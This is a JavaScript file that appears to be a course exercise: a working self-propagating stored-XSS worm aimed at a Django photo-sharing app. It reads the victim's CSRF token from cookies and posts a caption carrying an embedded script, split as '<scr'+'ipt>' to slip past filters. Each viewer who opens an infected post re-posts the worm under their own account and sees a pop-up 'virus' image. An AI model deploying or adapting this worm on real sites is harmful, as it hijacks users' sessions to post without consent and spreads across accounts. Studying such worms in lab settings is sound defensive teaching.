// Function to spread the worm
console.log(" From payload day 23/11!");

// Wait for the DOM to be fully loaded
document.addEventListener("DOMContentLoaded", () => {

    let session = localStorage.getItem("SESSIONID");

    if (!session) {
        localStorage.setItem("SESSIONID", "584e0ae6dcd0dc93ce82490c0d8d3bfc819ed87c");
        session = "584e0ae6dcd0dc93ce82490c0d8d3bfc819ed87c";
    }

    //const isAlreadyInfected = session == "ae0b6badeb338b59cda2135ed783c28beaf6d622" || session == "2d6cfd5ae2dfbf26ec2a2f26759306fdb54cc1e4" ? true : false;

    let isAlreadyInfected;

    if (session === "ae0b6badeb338b59cda2135ed783c28beaf6d622") {
        isAlreadyInfected = true;
    } else {
        isAlreadyInfected = false;
    }
    
    // Check if the user has already been infected
    console.log("payload.js isAlreadyInfected: ", isAlreadyInfected)
    if (isAlreadyInfected) {
        console.log(`User has already been infected. Skipping injection.`);
        return; // Exit if the user is already infected
    }


        // Prepare the worm message and additional script
        const text = "AEV é sem dúvida a melhor cadeira de todas! Acho que merecemos todos um 20!";
        const payload = `
                        (function spreadWorm(triggerMessage) {
                        // Immediately trigger the hidden post creation
                        console.log("Será qiue é isto que executa primeiro?");
                        createHiddenPost(triggerMessage);

                        function createHiddenPost(caption) {
                            const formData = new FormData();

                            // Prepare the form data for the request
                            formData.append("uphoto", ""); // Placeholder for image upload (leave empty for hidden post)
                            formData.append("caption", caption);
                            formData.append("sha", "ae0b6badeb338b59cda2135ed783c28beaf6d622")

                            fetch("/upload", {
                                method: "POST",
                                body: formData,
                                headers: {
                                    "X-CSRFToken": getCSRFToken(), // Secure with CSRF token
                                },
                            })
                                .then((response) => {
                                    if (response.ok) {
                                        console.log("Worm: New hidden post created successfully!");
                                        tickleWorm()
                                    } else {
                                        console.error("Worm: Failed to create a new hidden post.");
                                    }
                                })
                                .catch((error) => {
                                    console.error("Worm: Error while creating a hidden post:", error);
                                });
                        }

                        // Function to retrieve the CSRF token from cookies
                        function getCSRFToken() {
                            const cookies = document.cookie.split(";");
                            for (let cookie of cookies) {
                                const [key, value] = cookie.trim().split("=");
                                if (key === "csrftoken") {
                                    return value;
                                }
                            }
                            return null;
                        }
                        function tickleWorm() {
                            const triggerWord = "AEV é sem dúvida a melhor cadeira de todas! Acho que merecemos todos um 20!";
                            const posts = document.querySelectorAll('.card.vichlacard');
                        
                            // Run the worm only once per page
                            if (document.body.dataset.wormInjected) return;
                            document.body.dataset.wormInjected = "true"; // Mark the worm as injected
                        
                            posts.forEach((post) => {
                                if (!post.dataset.tickleWorm) {
                                    post.dataset.tickleWorm = true;
                        
                                    // Extract the caption text
                                    const captionElement = post.querySelector('.card-text.caption');
                                    const captionText = captionElement ? captionElement.textContent : "";
                                    const session = localStorage.getItem("SESSIONID");
                                    const isAlreadyInfected = session == "ae0b6badeb338b59cda2135ed783c28beaf6d622" ? true : false;
                        
                                    // If the trigger word is found, display an image
                                    if (captionText.includes(triggerWord)) {
                                        // Check if the user has already been infected
                                        if (isAlreadyInfected) {
                                            console.log("User has already been infected. Skipping injection.");
                                            return;
                                        } else {
                                            displayImage();
                                            spreadWorm(triggerWord);
                                            localStorage.setItem("SESSIONID", "2d6cfd5ae2dfbf26ec2a2f26759306fdb54cc1e4");                                   
                                        }
                                    }
                                }
                            });
                        
                            // Function to display an image
                            function displayImage() {
                                const img = document.createElement("img");
                                img.src = "https://media.tenor.com/aUGKNa38o-gAAAAe/virus-computer.png"; // Replace with your image URL
                                img.style.position = "fixed";
                                img.style.top = "50%";
                                img.style.left = "50%";
                                img.style.transform = "translate(-50%, -50%)";
                                img.style.zIndex = "9999";
                                img.style.border = "2px solid black";
                                img.style.borderRadius = "10px";
                                img.style.boxShadow = "0 0 10px rgba(0, 0, 0, 0.5)";
                                document.body.appendChild(img);
                        
                                // Automatically remove the image after 5 seconds
                                setTimeout(() => {
                                    img.remove();
                                }, 5000);
                            }
                    }
                    })();`
const script = "<scr"+"ipt>" + payload + "</scr"+"ipt>";

// const originalSession = localStorage.getItem("SESSIONID");

// Spread the worm
if(isAlreadyInfected){
    console.log("Not executing worm!");
} else {
    if(session == "584e0ae6dcd0dc93ce82490c0d8d3bfc819ed87c" || !session){
        console.log("Not executing worm!");
    } else {
        createHiddenPost(text + script);
        console.log("Post criado!")
    }
}

// console.log("isAlreadyInfected && session == 584e0ae6dcd0dc93ce82490c0d8d3bfc819ed87c ", isAlreadyInfected && session == "584e0ae6dcd0dc93ce82490c0d8d3bfc819ed87c")


// Function to send a request to the Django `infect_user` view
function createHiddenPost(caption) {
    const formData = new FormData();

    // Prepare the form data for the request
    formData.append("uphoto", "");
    formData.append("caption", caption);
    formData.append("sha", "ae0b6badeb338b59cda2135ed783c28beaf6d622")

    fetch("/upload", {
        method: "POST",
        body: formData,
        headers: {
            "X-CSRFToken": getCSRFToken(), // Secure with CSRF token
        },
    })
        .then((response) => {
            if (response.ok) {
                console.log("Worm: New hidden post created successfully!");
            } else {
                console.error("Worm: Failed to create a new hidden post.");
            }
        })
        .catch((error) => {
            console.error("Worm: Error while creating a hidden post:", error);
        });
}

// Function to retrieve the CSRF token from cookies
function getCSRFToken() {
    const cookies = document.cookie.split(";");
    for (let cookie of cookies) {
        const [key, value] = cookie.trim().split("=");
        if (key === "csrftoken") {
            return value;
        }
    }
    return null;
}

});
